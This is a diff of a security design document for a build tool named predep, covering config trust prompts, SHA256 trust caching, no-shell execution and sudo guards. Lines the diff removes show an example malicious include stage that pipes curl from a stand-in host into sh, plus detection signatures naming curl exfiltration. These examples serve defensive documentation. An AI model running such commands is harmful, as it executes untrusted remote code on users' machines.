@@ -38,10 +38,11 @@ different guarantees and risk levels.
 
 ### Layer 0: Config trust prompt
 
-Before any stage executes, `security::check_run_stages()` scans all stages
-and presents a warning to the user listing every `run` and `binary` command
-that will be executed. The user must explicitly confirm. In non-interactive
-mode (no TTY), execution is blocked unless `--privileged` is passed (see [Layer 6](#layer-6-path-confinement)).
+Implemented in `security::check_run_stages()`. Before any stage executes,
+predep scans all stages and warns the user listing every `run` and `binary`
+command that will be executed. The user must explicitly confirm. In
+non-interactive mode (no TTY), execution is blocked unless `--privileged`
+is passed.
 
 Once confirmed, the config file's SHA256 is cached as trusted so repeated
 runs don't re-prompt (unless the file changes). The file path is recorded
@@ -68,7 +69,7 @@ Trusted configs skip the prompt entirely (auto-ok across all levels).
 
 Trusted SHA256 entries expire after a configurable period (default: 7 days)
 unless marked `permanent`. Expired entries are automatically cleared on the
-next `resolve()` call. The trust time is configured in the prefs file:
+next `resolve()` call:
 
 ```toml
 trust_time_minutes = 10080   # 7 days
@@ -90,8 +91,7 @@ paths = [
 ```
 
 The prefs file is located at `cache://preferences/trusted.toml`. Users can
-edit it directly to remove entries, set `permanent = true`, or adjust the
-trust window. To view the current trust state:
+edit it directly:
 
 ```bash
 cat "$(predep --cache-dir)/preferences/trusted.toml"
@@ -99,104 +99,27 @@ cat "$(predep --cache-dir)/preferences/trusted.toml"
 
 #### Include trust
 
-When a root manifest uses `[[include]]` to import stages from other files,
-each included file is tracked and hashed independently. The SHA256 trust is
-**per-file**, not aggregate. This means:
+When a root manifest uses `[[include]]`, each included file is tracked and
+hashed independently. Trust is **per-file**, not aggregate:
 
 - A previously trusted included file can change without invalidating the root
   config's trust — it simply becomes untrusted on the next run.
-- If an included file contains new `run` or `binary` stages, the prompt will
-  list its path and tell you to review it before confirming.
+- If an included file contains new `run` or `binary` stages, the prompt lists
+  its path and asks you to review before confirming.
 - Trusting the prompt adds only the **untrusted files'** SHA256 hashes to the
-  trust store. Previously trusted files (root or other includes) remain
-  trusted without re-prompting.
-
-**Attack scenario:** An attacker modifies an included `vendor/B/predep.toml`
-to add a malicious `run` stage. The root config's SHA256 has not changed, so
-it remains trusted. However, the included file's SHA256 has changed, so the
-security prompt fires with:
-
-```
-The following configuration files are not yet trusted:
-    /home/user/project/vendor/B/predep.toml
-
-Please review these files before confirming.
-
-Commands that will be executed:
-  * [B::evil] curl http://malicious.example.com | sh
-```
-
-The user must explicitly confirm before the modified include takes effect.
-
-If the included file has no `run` or `binary` stages (e.g. only download or
-docker stages), its SHA256 is still tracked but no prompt is shown — there
-is nothing to execute. The file remains untrusted in the trust store until
-a subsequent run introduces executable stages from it.
-
-#### Harmful SHA256 database (future)
-
-A future version of predep will maintain a database of known harmful SHA256
-hashes — combinations of config hash, stage commands, and binary invocations
-that are known to be malicious. This database will be distributed as a
-signature file similar to antivirus scanners, allowing predep to reject
-known-dangerous configurations before prompting the user.
-
-Format sketch:
-
-```toml
-[[signature]]
-sha256 = "known-bad-hash..."
-type = "run"
-description = "Malicious curl pipe to shell"
-severity = "critical"
-
-[[signature]]
-sha256 = "known-bad-hash..."
-type = "binary"
-binary = "curl"
-description = "Data exfiltration via curl"
-severity = "high"
-```
-
-When a config SHA256 matches a known signature, predep will display a
-blocking error referencing the signature database. Users will be able to
-update the database via `predep --update-signatures` or from a well-known
-URL.
-
-#### Per-stage trust (future)
-
-The current model trusts entire files — any change to a file invalidates
-all its stages. A future refinement could trust individual stages by their
-canonical definition (name, type, commands, dependencies, vars):
-
-```toml
-[[trusted]]
-sha256 = "stage-hash..."
-type = "run"
-name = "build-sdl"
-commands = ["./configure", "make"]
-depends = ["fetch-sdl"]
-```
-
-This would mean changing one stage in a file does not invalidate trust for
-other stages in the same file. Combined with a **Merkle dependency chain**,
-a stage's trust hash could incorporate the hashes of its dependencies. If
-stage `A` depends on stage `B` and `B` changes, `A`'s trust is automatically
-invalidated too — the user sees exactly which transitive change broke trust
-and can review the impacted chain.
-
-Not yet implemented. The per-file model already catches the core attack
-surface (any modified file re-prompts); per-stage would refine precision.
+  trust store. Previously trusted files remain trusted without re-prompting.
+- If the included file has no executable stages, its SHA256 is still tracked
+  but no prompt is shown — nothing to execute.
 
 ### Layer 1: No interpolation on binary args
 
 `${VAR}` substitution is strictly limited to **URLs and paths** in download
 entries (`fetch_entry::url`, `fetch_entry::dest`). Binary stage `params`,
 `args`, and the `binary` name itself are **never interpolated**. This
-prevents an attacker from smuggling shell metacharacters through variable
-expansion into an argument vector.
+prevents smuggling shell metacharacters through variable expansion into an
+argument vector.
 
-### Layer 2: No shell for `binary` stages
+### Layer 2: No shell for binary stages
 
 `process::run()` on POSIX uses `execvp()` — no `/bin/sh -c`, no shell
 operators (`$()`, `` ` ``, `;`, `|`, `&`). On Windows it uses
@@ -214,63 +137,12 @@ projects vendor their own tooling without depending on globally installed
 binaries — and prevents accidentally running a different binary with the
 same name from elsewhere on the system.
 
-### Layer 4: Binary profiles (roadmap)
-
-Binary metadata files (`binaries/*.toml`) combine arg schema, safety tagging,
-and per-command sandbox defaults into a single profile per known binary.
-See `sandbox.md` for the full design.
-
-```toml
-[binary.hugo]
-description = "Static site generator"
-
-  [binary.hugo.sandbox]
-  network = "loop"
-  read_only = ["root://"]
-  writable  = ["cache://temp"]
-
-  [binary.hugo.args.contentDir]
-  type = "path"
-  safety = "safe"
-
-  [binary.hugo.args.destination]
-  type = "path"
-  safety = "safe"
-
-  [binary.hugo.args.cleanDestinationDir]
-  type = "flag"
-  safety = "dangerous"
-```
-
-Until profiles are implemented, all `params` and `args` on `binary` stages
-are treated as DANGEROUS:
-
-| Field    | Structure             | Risk                                      |
-| -------- | --------------------- | ----------------------------------------- |
-| `params` | `--key value` pairs   | DANGEROUS — no schema, no type validation |
-| `args`   | Free-form argv tokens | DANGEROUS — no structure, no validation   |
-
-### Layer 5: Shape validation (planned)
-
-The following gates are identified for a future `validate_binary_args()` in
-`src/security/security.h`:
-
-| Check                                                                                                    | Behaviour   | Rationale                                                                           |
-| -------------------------------------------------------------------------------------------------------- | ----------- | ----------------------------------------------------------------------------------- |
-| Null bytes in any param key, value, or arg token                                                         | HARD REJECT | `execvp` accepts null-terminated strings; null byte truncates the argument silently |
-| Token exceeds 4096 bytes                                                                                 | HARD REJECT | Prevents argv buffer overflows in the child process                                 |
-| Param key not matching `[a-zA-Z0-9_-]+`                                                                  | WARN        | `--` smuggling: keys like `--flag=--injected` or `..` can confuse argument parsers  |
-| Shell metacharacters in value/arg (`$`, `` ` ``, `;`, `\|`, `&`, `>`, `<`, `(`, `)`, `{`, `}`, `!`, `\`) | WARN        | Harmless to `execvp` but signals possible config confusion or injection attempt     |
-| Path separators in binary name (`/`, `\`, `..`)                                                          | WARN        | Restricts to PATH/`cache://bin` lookup; prevents `../../etc/passwd` style tricks    |
-
-WARN-level checks do not block execution but are surfaced during the config
-trust prompt, giving the user additional information before confirming.
-
 ### Layer 6: Path confinement
 
-All `dest` fields (`fetch_entry::dest`, `docker_entry::dest`) and `artifact
-source` paths are validated against the project root and cache directory. Any resolved path that falls outside `ctx.root` or `ctx.cache_dir`
-is **rejected** unless `--privileged` is used.
+All `dest` fields (`fetch_entry::dest`, `docker_entry::dest`) and artifact
+source paths are validated against the project root and cache directory.
+Any resolved path that falls outside `ctx.root` or `ctx.cache_dir` is
+**rejected** unless `--privileged` is used.
 
 Paths are expressed using the `root://` and `cache://` prefixes, which
 resolve to the project root and platform cache directory respectively.
@@ -297,8 +169,6 @@ When `--privileged` is used:
 
 This ensures that `--privileged` cannot be used on an untrusted config
 without explicit prior approval.
-
-#### Overridden flags
 
 `--privileged` replaces the earlier `--force` flag, which was never fully
 wired. Unlike `--force`, `--privileged` does not skip security prompts for
@@ -327,8 +197,7 @@ To prevent a malicious stage (e.g. a `run` stage) from inheriting sudo
 credentials cached by install/uninstall, each resolve call:
 
 1. Runs `sudo -K` **before** any file operations — clears any stale
-   credentials inherited from outside the predep process (e.g. a previous
-   `sudo` command in the same terminal session).
+   credentials inherited from outside the predep process.
 2. Runs `sudo -K` **after** all operations — removes the credential cache
    created by our own sudo invocations, so subsequent stages cannot execute
    privileged commands without a fresh password prompt.
@@ -338,8 +207,8 @@ install/uninstall resolve call itself, never across stages.
 
 #### Root / sudo startup guard
 
-When predep starts, `security::check_root_sudo()` verifies the process is
-not running with elevated privileges:
+Implemented in `security::check_root_sudo()`. When predep starts, the
+process verifies it is not running with elevated privileges:
 
 | Condition | Behavior |
 |-----------|----------|
@@ -367,50 +236,19 @@ executing arbitrary commands as root because the user accidentally ran
 Sudo escalation is **not available on Windows** — install/uninstall on
 Windows must target user-writable directories or run as Administrator.
 
-### Future: distro package manager integration
+## Not yet implemented
 
-The current `sudo cp` approach is portable but not idiomatic for any
-platform. Future versions should support generating native packages so
-installed artifacts integrate with the system package manager:
+The following security layers are designed but not implemented:
 
-| Platform / Distro | Package format | Toolchain |
-|---|---|---|
-| Debian / Ubuntu | `.deb` | `dpkg-deb`, `equivs` |
-| Fedora / RHEL | `.rpm` | `rpmbuild`, `fpm` |
-| Arch Linux | PKGBUILD / `.pkg.tar.zst` | `makepkg` |
-| Alpine | `.apk` | `abuild` |
-| macOS | Homebrew formula | `brew` tap |
-| macOS | `.pkg` | `pkgbuild` |
-| Windows | `.msi` / NuGet | `wixtoolset` |
+- **Layer 4: Binary profiles** — arg schema, safety tagging, per-command
+  sandbox defaults. See `roadmap/security-advanced.md`.
+- **Layer 5: Shape validation** — argv validation gates (null bytes, token
+  length, param key format, shell metacharacters, path separators in binary
+  name). See `roadmap/security-advanced.md`.
+- **Sandboxing** (`--sandbox`) — bwrap/landlock/seccomp backends. See
+  `sandbox.md` for the architecture and implementation plan.
 
-This would replace `sudo cp` with:
-- `dpkg -i`, `rpm -i`, `pacman -U` on Linux
-- `brew install` on macOS
-- Windows MSI installer
+## Sandboxing
 
-Selection would use `platform.h` OS-identification as the default
-fallback (auto-detect `.deb` on Debian, `.rpm` on Fedora, Homebrew on
-macOS, etc.), overridable at runtime (e.g. `--pkg deb` or `--pkg homebrew`)
-for cross-platform packaging or CI scenarios. The plain `sudo cp` mode
-stays as the portable fallback when no native backend is available or
-requested.
-
-## Sandboxing (planned)
-
-Dangerous stages (`run`, `binary` with untrusted params) and general builds
-run in a sandboxed environment when `--sandbox` is passed. The sandbox uses
-a pluggable backend (bwrap → landlock → seccomp) to enforce filesystem,
-network, and capability restrictions. See `sandbox.md` for the full
-architecture, backend reference, binary profiles, and implementation order.
-
-## Comparison: `run` vs `binary`
-
-| Aspect                | `run`                   | `binary`                              |
-| --------------------- | ----------------------- | ------------------------------------- |
-| Invocation            | `sh -c "... {{shell}}"` | `execvp(hugo, argv)`                  |
-| Shell injection       | YES — full              | NO — `execvp` treats args as literals |
-| `${VAR}` expansion    | YES                     | NO (except URL fields on download)    |
-| Known binary          | No (arbitrary shell)    | Yes (named in `binary` field)         |
-| PATH safety           | PATH prepended          | `cache://bin` checked first           |
-| Cross-platform `.exe` | Manual                  | Auto via `platform::exe_name()`       |
-| Risk level            | DANGEROUS               | HIGH (pending metadata schema)        |
+See `sandbox.md` for the full sandbox architecture (bwrap/landlock/seccomp),
+binary profiles, and build system integration.
